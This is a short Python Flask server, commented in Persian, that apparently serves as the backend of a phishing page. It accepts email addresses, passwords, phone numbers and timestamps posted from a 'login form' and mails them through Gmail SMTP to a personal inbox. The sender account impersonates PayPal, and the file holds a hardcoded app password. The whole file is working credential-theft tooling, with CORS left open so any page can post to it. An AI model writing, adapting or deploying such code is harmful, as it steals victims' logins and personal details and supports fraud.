from flask import Flask, request, jsonify
from flask_cors import CORS
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

app = Flask(__name__)
CORS(app)  # برای رفع مشکل CORS

# تنظیمات ایمیل
SENDER_EMAIL = "1.paypal.official.2@gmail.com"
SENDER_PASSWORD = "bdem exwo hnfa jejl"
RECEIVER_EMAIL = "amirjonx89@gmail.com"

def send_email(subject, body):
    # اتصال به SMTP گوگل
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(SENDER_EMAIL, SENDER_PASSWORD)
    
    # ساختن ایمیل
    msg = MIMEMultipart()
    msg['From'] = SENDER_EMAIL
    msg['To'] = RECEIVER_EMAIL
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))
    
    # ارسال ایمیل
    server.send_message(msg)
    server.quit()

@app.route('/submit', methods=['POST'])
def submit_details():
    data = request.get_json()
    print("اطلاعات دریافت‌شده:", data)
    
    # محتوای ایمیل
    subject = "اطلاعات جدید از فرم لاگین"
    body = f"""
    ایمیل: {data['email']}
    رمز عبور: {data['password']}
    شماره تلفن: {data['phone']}
    زمان ارسال: {data['timestamp']}
    """
    
    # ارسال ایمیل
    send_email(subject, body)
    
    return jsonify({"message": "اطلاعات با موفقیت ارسال شد!"}), 200

if __name__ == '__main__':
    app.run(debug=True)
